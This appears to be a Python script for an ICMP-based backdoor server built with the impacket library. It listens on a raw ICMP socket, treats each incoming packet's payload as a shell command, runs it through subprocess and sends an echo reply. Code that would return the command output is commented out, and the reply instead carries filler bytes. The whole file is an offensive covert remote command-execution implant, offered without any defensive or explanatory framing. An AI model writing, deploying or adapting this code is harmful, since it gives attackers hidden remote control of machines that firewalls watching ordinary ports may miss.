#!/bin/python3
import select
import socket
import time
import sys
import subprocess
from impacket import ImpactDecoder, ImpactPacket

print("Starting pong server...")

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

lol = ImpactPacket.ICMP().get_data_as_string
while 1:
    # Give the ICMP packet the next ID in the sequence.
    #seq_id += 1
    #icmp.set_icmp_id(seq_id)

    # Calculate its checksum.
    #icmp.set_icmp_cksum(0)
    #icmp.auto_checksum = 1

    # Send it to the target host.
    #s.sendto(ip.get_packet(), (dst, 0))

    # Wait for incoming replies.
    if s in select.select([s], [], [], 1)[0]:
      reply = s.recvfrom(2000)[0]
       
       # Use ImpactDecoder to reconstruct the packet hierarchy.
      rip = ImpactDecoder.IPDecoder().decode(reply)
       # Extract the ICMP packet from its container (the IP packet).
      ricmp = rip.child()
      try:
        command = ricmp.get_data_as_string().decode().split(' ')
        print(command)
        output = subprocess.check_output(command)
      except:
        output = "invalid command"
      
      
      print(output)
      #commannd_output = subprocess.Popen(ricmp.get_data_as_string(), shell=True, capt)
      #print(commannd_output)
      #print(rip)
      ip = ImpactPacket.IP()
      ip.set_ip_src(rip.get_ip_dst())
      ip.set_ip_dst(rip.get_ip_src())

       # If the packet matches, report it to the user.
       #if rip.get_ip_dst() == src and rip.get_ip_src() == dst and icmp.ICMP_ECHOREPLY == ricmp.get_icmp_type():
        #   print("Ping reply for sequence #%d" % ricmp.get_icmp_id())



    # Create a new ICMP packet of type ECHO.
      print(f'rip = {ricmp}')
      icmp = ImpactPacket.ICMP()
      icmp.set_icmp_type(icmp.ICMP_ECHOREPLY)
      icmp.set_icmp_id(ricmp.get_icmp_id()+1)
      #icmp.contains(ImpactPacket.Data(output.encode()))
      icmp.contains(ImpactPacket.Data(b'AAAAAAAAAAAAAAAAAAAA'))
      s.sendto(ip.get_packet(), (rip.get_ip_src(), 0))

    time.sleep(1)
